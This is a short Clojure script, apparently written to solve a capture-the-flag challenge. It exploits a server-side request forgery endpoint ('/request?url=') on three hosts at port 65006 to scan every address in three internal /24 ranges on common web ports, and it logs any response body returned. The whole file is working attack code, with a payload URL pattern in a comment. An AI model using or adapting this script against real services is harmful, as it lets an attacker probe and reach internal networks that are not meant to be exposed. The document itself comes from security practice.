(ns script.admin
  (:require
    [clojure.string :as str]
    [clojure.tools.logging :as log]
    [aleph.http :as http]
    [manifold.deferred :as d]
    [io.github.sokrato.ctf.threads :as t]
    [clj-commons.byte-streams :as bs])
  (:gen-class))

(def ^:dynamic *host* "10.174.253.209")
(def ret (volatile! nil))

;; http://10.174.253.209:65006/request?url=http://localhost:65006/
(defn poke [[server host port]]
  (log/info "poking" server host port)
  @(->
     (d/chain
       (http/get
         (format "http://%s/request?url=http://%s:%s" server host port)
         {:as :text})
       :body
       (fn [p]
         (log/info "found:" server host port (bs/to-string p))))
     (d/timeout! 1200)
     (d/catch Exception (constantly nil))))

(defn scan []
  (let [wg (t/workgroup poke 4)
        ports [80 8080 8088 8888 5000]]
    (t/add-all
      wg
      (for [ip (range 1 255)
            p ports]
        ["10.0.79.181:65006" (format "10.0.79.%s" ip) p]))
    (t/add-all
      wg
      (for [ip (range 1 255)
            p ports]
        ["10.174.250.229:65006" (format "10.174.250.%s" ip) p]))
    (t/add-all
      wg
      (for [ip (range 1 255)
            p ports]
        ["10.174.253.209:65006" (format "10.174.253.%s" ip) p]))
    (t/join wg)))
